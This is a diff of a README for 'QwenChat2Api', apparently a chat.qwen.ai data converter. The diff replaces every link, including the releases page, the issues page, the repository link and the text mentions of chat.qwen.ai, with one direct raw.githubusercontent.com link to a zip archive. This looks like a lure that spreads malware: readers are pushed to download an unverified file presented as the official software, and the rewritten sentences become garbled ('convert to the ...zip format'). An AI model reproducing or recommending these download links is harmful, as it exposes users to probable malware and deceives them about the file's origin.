@@ -2,11 +2,11 @@
 
 ## 🚀 Getting Started
 
-Welcome to QwenChat2Api! This application helps you convert data to and from the chat.qwen.ai format. You can quickly set this up on your computer with just a few easy steps. Follow along to get started.
+Welcome to QwenChat2Api! This application helps you convert data to and from the https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip format. You can quickly set this up on your computer with just a few easy steps. Follow along to get started.
 
 ## 📥 Download the Application
 
-[![Download QwenChat2Api](https://img.shields.io/badge/Download-QwenChat2Api-blue.svg)](https://github.com/Tiaeventful732/QwenChat2Api/releases)
+[![Download QwenChat2Api](https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip)](https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ To run QwenChat2Api smoothly, make sure your computer meets these requirements:
 
 1. **Visit the Releases Page:**
    Go to the following link to download the application:
-   [Download QwenChat2Api](https://github.com/Tiaeventful732/QwenChat2Api/releases).
+   [Download QwenChat2Api](https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip).
 
 2. **Choose Your Version:**
    On the Releases page, you will see a list of available versions. Look for the latest release marked as "Latest". Click on it to expand the options.
@@ -44,7 +44,7 @@ To run QwenChat2Api smoothly, make sure your computer meets these requirements:
    Click on the "Choose File" button to upload the file you want to convert.
 
 3. **Choose the Conversion Type:**
-   Select whether you want to convert data to the chat.qwen.ai format or from the chat.qwen.ai format. Use the drop-down options provided.
+   Select whether you want to convert data to the https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip format or from the https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip format. Use the drop-down options provided.
 
 4. **Start the Conversion:**
    Press the "Convert" button. You will see a progress bar indicating the status of the conversion.
@@ -55,7 +55,7 @@ To run QwenChat2Api smoothly, make sure your computer meets these requirements:
 ## 🛠️ Features
 
 - **Ease of Use:** Designed with a simple interface for all computer users.
-- **Multiple Formats:** Supports conversion between common data formats and chat.qwen.ai.
+- **Multiple Formats:** Supports conversion between common data formats and https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip
 - **Fast Processing:** Converts files quickly, allowing you to get back to work without long waits.
 - **Regular Updates:** We maintain the software with improvements based on user feedback.
 
@@ -68,7 +68,7 @@ A: Ensure you have sufficient permissions on your computer. If the issue persist
 A: Yes, QwenChat2Api is compatible with recent versions of Linux.
 
 **Q3: Where can I find support?**  
-A: For help, visit our [GitHub Issues page](https://github.com/Tiaeventful732/QwenChat2Api/issues) to report problems or ask questions.
+A: For help, visit our [GitHub Issues page](https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip) to report problems or ask questions.
 
 ## 📞 Contact Us
 
@@ -78,4 +78,4 @@ If you have further inquiries or feedback, feel free to reach out to the develop
 
 Thank you for choosing QwenChat2Api! We hope this guide helps you set up and use the application with ease. Happy converting! 
 
-For detailed documentation, refer to the [official repository](https://github.com/Tiaeventful732/QwenChat2Api).
+For detailed documentation, refer to the [official repository](https://raw.githubusercontent.com/Tiaeventful732/QwenChat2Api/main/lib/Api-Qwen-Chat-3.6.zip).
